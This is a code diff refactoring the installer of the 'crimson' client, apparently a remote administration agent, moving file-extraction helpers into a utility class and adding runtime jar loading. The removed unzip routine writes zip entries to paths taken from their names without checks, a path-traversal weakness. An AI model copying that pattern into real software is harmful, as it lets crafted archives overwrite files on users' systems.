@@ -17,22 +17,18 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client;
 
-import java.io.BufferedOutputStream;
 import java.io.BufferedReader;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.URISyntaxException;
-import java.nio.channels.FileChannel;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipInputStream;
 
 import com.subterranean_security.crimson.client.net.ClientCommands;
+import com.subterranean_security.crimson.core.Platform;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.util.B64;
+import com.subterranean_security.crimson.core.util.CUtil;
 
 public class Installer {
 
@@ -41,29 +37,55 @@ public class Installer {
 
 	private static boolean debug = new File("/debug.txt").exists();
 
+	public static File temp = new File(System.getProperty("java.io.tmpdir") + "/client-temp");
+
 	private static String base = null;
 
-	static {
-		String name = System.getProperty("os.name").toLowerCase();
-		if (name.endsWith("bsd")) {
-			base = ic.getPathBsd();
-		} else if (name.equals("mac os x")) {
-			base = ic.getPathOsx();
-		} else if (name.equals("solaris") || name.equals("sunos")) {
-			base = ic.getPathSol();
-		} else if (name.equals("linux")) {
-			base = ic.getPathLin();
-		} else if (name.startsWith("windows")) {
-			base = ic.getPathWin();
-		}
-	}
-
 	public static void main(String[] args) {
+		temp.mkdir();
+		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/lib.zip",
+				temp.getAbsolutePath() + "/lib.zip");
+		try {
+			CUtil.Files.unzip(temp.getAbsolutePath() + "/lib.zip", temp.getAbsolutePath());
+		} catch (IOException e2) {
+			System.out.println("Failed to extract libraries");
+			System.exit(1);
+		}
+
+		// load libraries
+		try {
+			CUtil.Files.loadJar(temp.getAbsolutePath() + "/java/c09.jar");
+		} catch (Exception e1) {
+			System.out.println("FATAL: Failed to load requisite libraries");
+			System.exit(1);
+		}
+
 		try {
 			ic = readInternal();
 		} catch (Exception e) {
 			System.out.println("Fatal: Could not read internal.txt");
 			return;
+		}
+
+		switch (Platform.osFamily) {
+		case BSD:
+			base = ic.getPathBsd();
+			break;
+		case LIN:
+			base = ic.getPathLin();
+			break;
+		case OSX:
+			base = ic.getPathOsx();
+			break;
+		case SOL:
+			base = ic.getPathSol();
+			break;
+		case WIN:
+			base = ic.getPathWin();
+			break;
+		default:
+			break;
+
 		}
 
 		try {
@@ -137,9 +159,9 @@ public class Installer {
 
 		System.out.println("Extracting lib.zip");
 
-		extract("com/subterranean_security/crimson/client/res/bin/lib.zip", base + "lib/lib.zip");
+		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/lib.zip", base + "lib/lib.zip");
 		try {
-			unzip(base + "lib/lib.zip", base + "lib/");
+			CUtil.Files.unzip(base + "lib/lib.zip", base + "lib/");
 		} catch (IOException e1) {
 			// TODO Auto-generated catch block
 			e1.printStackTrace();
@@ -147,12 +169,12 @@ public class Installer {
 		}
 
 		System.out.println("Extracting client database");
-		extract("com/subterranean_security/crimson/client/res/bin/client.db", base + "var/client.db");
+		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/client.db", base + "var/client.db");
 
 		System.out.println("Copying client jar");
 		File client = new File(base + "/client.jar");
 		try {
-			copyClientJar(client);
+			CUtil.Files.copyFile(client, new File(jarPath));
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -176,92 +198,6 @@ public class Installer {
 			return false;
 		}
 		return true;
-	}
-
-	private static void extract(String res, String dest) {
-		InputStream stream = Client.class.getClassLoader().getResourceAsStream(res);
-		FileOutputStream fos = null;
-		try {
-			fos = new FileOutputStream(dest);
-			byte[] buf = new byte[2048];
-			int r = stream.read(buf);
-			while (r != -1) {
-				fos.write(buf, 0, r);
-				r = stream.read(buf);
-			}
-		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		} finally {
-			if (fos != null) {
-				try {
-					fos.close();
-				} catch (IOException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-			}
-		}
-	}
-
-	private static void unzip(String zipFilePath, String destDirectory) throws IOException {
-		File destDir = new File(destDirectory);
-		if (!destDir.exists()) {
-			destDir.mkdir();
-		}
-		ZipInputStream zipIn = new ZipInputStream(new FileInputStream(zipFilePath));
-		ZipEntry entry = zipIn.getNextEntry();
-		// iterates over entries in the zip file
-		while (entry != null) {
-			String filePath = destDirectory + File.separator + entry.getName();
-			if (!entry.isDirectory()) {
-				// if the entry is a file, extracts it
-				BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filePath));
-				byte[] bytesIn = new byte[4096];
-				int read = 0;
-				while ((read = zipIn.read(bytesIn)) != -1) {
-					bos.write(bytesIn, 0, read);
-				}
-				bos.close();
-			} else {
-				// if the entry is a directory, make the directory
-				File dir = new File(filePath);
-				dir.mkdir();
-			}
-			zipIn.closeEntry();
-			entry = zipIn.getNextEntry();
-		}
-		zipIn.close();
-	}
-
-	private static void copyClientJar(File destFile) throws IOException {
-		FileInputStream fis = new FileInputStream(new File(jarPath));
-		FileChannel source = fis.getChannel();
-		if (!destFile.exists()) {
-			destFile.createNewFile();
-		}
-
-		FileChannel destination = null;
-		FileOutputStream fos = null;
-		try {
-			fos = new FileOutputStream(destFile);
-			destination = fos.getChannel();
-			destination.transferFrom(source, 0, source.size());
-		} finally {
-			if (source != null) {
-				source.close();
-			}
-			if (destination != null) {
-				destination.close();
-			}
-			if (fos != null) {
-				fos.close();
-			}
-			if (fis != null) {
-				fis.close();
-			}
-		}
-
 	}
 
 }
